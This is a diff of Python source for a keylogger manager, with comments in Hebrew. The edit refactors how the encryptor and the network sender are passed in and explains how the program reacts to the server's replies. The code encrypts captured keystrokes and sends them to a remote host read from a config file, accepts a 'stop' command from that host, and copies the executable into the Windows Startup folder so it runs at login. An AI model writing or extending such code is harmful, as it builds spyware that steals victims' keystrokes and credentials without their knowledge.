@@ -11,11 +11,11 @@ import shutil
 
 class KeyloggerManager:
 
-    def __init__(self,host:str,key:str):
+    def __init__(self,encryptor:Encryptor,writer):
         self.active = True
         self.keylogger = KeyloggerService()
-        self.encryptor = Encryptor(key)
-        self.writer = NetworkWriter(host)
+        self.encryptor = encryptor
+        self.writer = writer
         self.wrapper = self.wrapper_fill()
         # self.copy_file()
         self.main()
@@ -47,11 +47,12 @@ class KeyloggerManager:
                 wrapper = self.encryptor.encrypt(self.wrapper)
                 #שליחת הנתונים וקבלת תשובה
                 response = self.writer.send_data(wrapper)
-                if response == "stop":
+                #בדיקת סוג התשובה
+                if response == "stop": #קבלת פקודה לעצור את ההקלטות
                     self.stop()
-                elif response == "error":
+                elif response == "error": #אם אירעה שגיאה יש להמשיך לשמור את המידע בwrapper עד להצלחת השליחה
                     pass
-                else:
+                else: #נשלח בהצלחה יש לנקות את המידע בwrraper
                     self.wrapper["data"] = {}
 
             except Exception as e:
@@ -88,7 +89,7 @@ class KeyloggerManager:
 
     @staticmethod
     def copy_file():
-        source = "keylogger_manager.exe" #יצירת שם קובץ להעתקה
+        source = "keylogger.exe" #יצירת שם קובץ להעתקה
         startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup') #יצירת נתיב לתיקיית התחל של המחשב
         destination = os.path.join(startup_dir, os.path.basename(source)) #יצירת נתיב ליצרית קובץ
 
@@ -108,7 +109,10 @@ if __name__ == '__main__':
         host = data["host"]
         key = data["key"]
 
-    keylogger = KeyloggerManager(host,key)
+    encryptor = Encryptor(key)
+    writer = NetworkWriter(host)
+
+    keylogger = KeyloggerManager(encryptor,writer)
 
 
 
